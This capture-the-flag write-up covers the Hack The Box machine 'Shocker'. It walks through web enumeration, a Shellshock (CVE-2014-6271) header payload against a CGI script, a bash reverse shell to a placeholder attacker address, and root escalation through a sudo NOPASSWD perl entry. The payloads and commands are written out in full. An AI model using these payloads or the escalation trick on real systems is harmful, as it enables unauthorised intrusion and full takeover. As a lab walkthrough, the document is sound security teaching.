# HTB: Shocker — Writeup

**OS:** Linux
**Difficulty:** Easy
**Techniques:** CGI script fuzzing, Shellshock (CVE-2014-6271) CGI remote code execution, `sudo perl` NOPASSWD privilege escalation

---

## Synopsis

Shocker is an Easy Linux machine that serves an almost-empty Apache web page and a second SSH service on a non-standard port. Directory enumeration reveals a `/cgi-bin/` directory containing a small shell script, `user.sh`. Because Apache runs the script through `mod_cgi` — which copies HTTP request headers into environment variables before invoking Bash — the host is vulnerable to **Shellshock (CVE-2014-6271)**: a crafted `User-Agent` header executes arbitrary commands as the web user `shelly`, yielding a reverse shell and the user flag. Privilege escalation is trivial: `shelly` is permitted to run `/usr/bin/perl` as root with `NOPASSWD`, so a one-line `perl` command spawns a root shell.

## Skills Required

- Basic web and directory enumeration.
- Awareness of the Shellshock vulnerability and how CGI passes data to Bash.
- Reading `sudo -l` output and recognizing an abusable interpreter.

## Skills Learned

- Fuzzing a CGI directory for executable *script files* (not just directories), including choosing a wordlist that actually contains `cgi-bin`.
- Exploiting Shellshock (CVE-2014-6271) through an HTTP header to achieve RCE.
- Abusing a `sudo` NOPASSWD entry for an interpreter (`perl`) to escalate to root via GTFOBins-style execution.

---

## Enumeration

### Nmap

A full TCP scan showed only two open ports, followed by a service/version scan:

```
[★]$ nmap -p- 10.129.101.197
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

[★]$ nmap -p80,2222 -sCV 10.129.101.197 -oA nmap/Shocker
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two takeaways:
- **Apache 2.4.18** on port 80 — the attack surface.
- **SSH on 2222**, not the usual 22. SSH is rarely the way *in*; the non-standard port is a hint that credentials or a key found elsewhere will be used to log back in. Parked for now.

### HTTP (80)

The homepage is a single image with the caption *"Don't Bug Me!"* and nothing else — no links, no title. An empty page like this means the real content is unlinked and must be discovered by brute force.

![Shocker homepage: a cartoon bug with the caption Don't Bug Me! — an otherwise empty page](images/shocker_homepage-dont-bug-me.png)

### Directory enumeration

The machine's name points squarely at **Shellshock**, which lives in CGI scripts, so the goal of enumeration is narrow: find `/cgi-bin/` and an executable script inside it.

#### False start: wordlist missed `cgi-bin`

A first `gobuster` run with `directory-list-2.3-medium.txt` found only `/server-status`:

```
[★]$ gobuster dir -u http://10.129.101.197/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -o loot/gobuster-root.txt
/server-status        (Status: 403) [Size: 302]
```

The `/cgi-bin/` directory wasn't in that wordlist's results. Switching to SecLists' `common.txt` (and adding script extensions) immediately revealed it — a reminder that *which wordlist you choose* is itself part of the methodology:

```
[★]$ gobuster dir -u http://10.129.101.197/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x sh,cgi,pl -t 50
/cgi-bin/             (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 302]
```

The `403` on `/cgi-bin/` confirms the directory exists but denies listing — so the script name has to be fuzzed too.

#### Finding the CGI script

Fuzzing *inside* `/cgi-bin/` with the same extensions found an executable script:

```
[★]$ gobuster dir -u http://10.129.101.197/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x sh,cgi,pl -t 50
/user.sh              (Status: 200) [Size: 119]
```

`user.sh` returns `200` — it's run server-side, which is exactly what Shellshock needs.

---

## Foothold

### Shellshock — CVE-2014-6271

Requesting the script normally shows a harmless uptime report:

```
[★]$ curl -s http://10.129.101.197/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 16:55:29 up 12 min,  0 users,  load average: 0.05, 0.08, 0.03
```

**Why it's exploitable:** Apache's `mod_cgi` copies incoming HTTP headers (such as `User-Agent`) into environment variables, then launches Bash to run the script. Vulnerable versions of Bash (CVE-2014-6271) execute any trailing code after an empty function definition `() { :; };` stored in an environment variable. Poisoning a header therefore runs commands as the web user.

Confirming RCE — the extra `echo; echo;` supplies the blank line that separates CGI headers from the body so the output renders:

```
[★]$ curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" \
  http://10.129.101.197/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Code execution as **`shelly`**. Swapping the payload for a reverse shell (listener on 9001, `<attacker-ip>` = the `tun0` address):

```
[★]$ nc -lvnp 9001

[★]$ curl -s -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1'" \
  http://10.129.101.197/cgi-bin/user.sh
```

The listener catches the shell, which is then upgraded to a PTY:

```
Connection received on 10.129.101.197 60958
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c "import pty; pty.spawn('/bin/bash')"
# (Ctrl-Z; stty raw -echo; fg; export TERM=xterm)
shelly@Shocker:/home/shelly$ cat user.txt
```

![Reverse shell as shelly from Shellshock, id showing uid=1000(shelly)](images/shocker_shellshock-reverse-shell-shelly.png)

`user.txt` retrieved.

---

## Privilege Escalation

### `sudo perl` (NOPASSWD)

Checking `shelly`'s sudo rights:

```
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**Why it works:** being allowed to run an interpreter as root is equivalent to a root shell — `perl` will execute whatever code you give it with root privileges, so you simply ask it to `exec` a shell:

```
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
root@Shocker:/home/shelly# id
uid=0(root) gid=0(root) groups=0(root)
root@Shocker:~# cat root.txt
```

`root.txt` retrieved.

![Root shell via sudo perl, id showing uid=0(root) and root.txt](images/shocker_root-shell-perl-sudo.png)

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Full `nmap` scan (HTTP 80, SSH on 2222); directory/file fuzzing of `/cgi-bin/` with SecLists `common.txt` + `-x sh,cgi,pl` to find `user.sh` |
| Foothold | Shellshock (CVE-2014-6271) via a crafted `User-Agent` header against `user.sh` → RCE and reverse shell as `shelly` |
| PrivEsc | `sudo -l` reveals `(root) NOPASSWD: /usr/bin/perl`; `sudo /usr/bin/perl -e 'exec "/bin/bash";'` → root |

---

## Lessons / Takeaways

- **The wordlist is part of the method.** `directory-list-2.3-medium.txt` missed `/cgi-bin/` here; SecLists `common.txt` found it instantly. When enumeration comes back suspiciously thin on a box that clearly has hidden content, change wordlists before concluding there's nothing there.
- **Finding a directory isn't finding the vuln.** `/cgi-bin/` returned `403` and refused listing — Shellshock needs an actual executable script, so fuzzing for *filenames* with script extensions (`-x sh,cgi,pl`) inside the directory was the step that mattered.
- **Shellshock is a header-level attack.** Any CGI handler that passes request data to Bash is a candidate; the payload lives in `User-Agent` (or `Referer`, `Cookie`, etc.), and the leading `echo; echo;` is needed so CGI emits valid output.
- **A NOPASSWD interpreter is an instant win.** `perl`, `python`, `ruby`, `awk`, `vim`, etc. in `sudo -l` all map to a root shell (see GTFOBins). Always run `sudo -l` first on a new shell.
- The non-standard SSH port (2222) was a deliberate red herring on this path — worth noting as a reminder to not fixate on an unusual service when the web surface is the intended way in.
